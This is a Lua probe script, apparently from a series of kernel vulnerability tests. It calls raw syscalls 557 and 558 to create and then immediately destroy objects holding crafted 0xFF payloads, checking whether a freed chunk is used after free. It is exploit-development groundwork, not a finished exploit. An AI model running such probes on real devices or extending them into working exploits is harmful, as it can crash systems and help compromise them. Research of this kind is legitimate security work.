-- CRASH_CLASS: HIGH
-- PROBE 789a: destroy a 557 object whose job may still be running
--
-- An all-0xFF payload stalled the family for ~30 s (784a then 785a then 786a
-- recovery), so that payload does something. Free it at once and keep
-- creating: if the family stays healthy and nothing crashes, the job holds no
-- pointer to the freed payload; if it stalls or dies, the 0x20 chunk is used
-- after free.
print("=== PROBE 789a: 557 FREE RUNNING JOB ===")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function U(a)
    a=to_num(a); if a<0 then a=a+18446744073709551616 end
    return uint64(string.format("0x%08X%08X",math.floor(a/4294967296),a%4294967296))
end
local function call(sc,a1,a2,a3,a4,a5,a6)
    local ok,r=pcall(function() return sc(U(a1),U(a2),U(a3),U(a4),U(a5),U(a6)) end)
    if not ok then return "ERR" end
    return to_num(r)
end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function alive() return tostring(call(mk(20),0,0,0,0,0,0)) end
local pl=to_num(memory.alloc(0x100))
local function payload(mode)
    for i=0,0x100-8,8 do wq(pl+i,0) end
    if mode=="ff" then for i=0,3 do wq(pl+i*8,0xFFFFFFFFFFFFFFFF) end end
end
local function mknew(mode,tag)
    payload(mode)
    local r=call(mk(557),pl,0x1000,0,0,0,0)
    print(string.format("[%s] create(%s)=%s alive=%s",tag,mode,tostring(r),alive()))
    return r
end
local function kill(id,tag)
    if type(id)=="number" and id>0 then
        print(string.format("[%s] destroy(%s)=%s alive=%s",tag,tostring(id),tostring(call(mk(558),id,0,0,0,0,0)),alive()))
    end
end
-- [A] control: zeros, free at once, then three more
local a=mknew("z","A"); kill(a,"A")
for i=1,3 do local r=mknew("z","A"..i); kill(r,"A"..i) end
-- [B] 0xFF payload, freed at once, then three more
local b=mknew("ff","B"); kill(b,"B")
for i=1,3 do local r=mknew("z","B"..i); kill(r,"B"..i) end
-- [C] eight 0xFF objects, freed at once
local ids={}
for i=1,8 do ids[i]=mknew("ff","C"..i) end
for i=1,8 do kill(ids[i],"C"..i.."d") end
-- [D] can the family still create?
local d=mknew("z","D"); kill(d,"D")
-- [E] spin, then create again
for i=1,5000 do call(mk(20),0,0,0,0,0,0) end
local e=mknew("z","E"); kill(e,"E")
print("[F] final alive="..alive())
print("=== 789a DONE ===")
